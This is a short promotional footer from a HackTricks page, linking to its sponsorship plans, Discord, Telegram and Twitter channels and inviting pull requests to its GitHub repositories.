* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
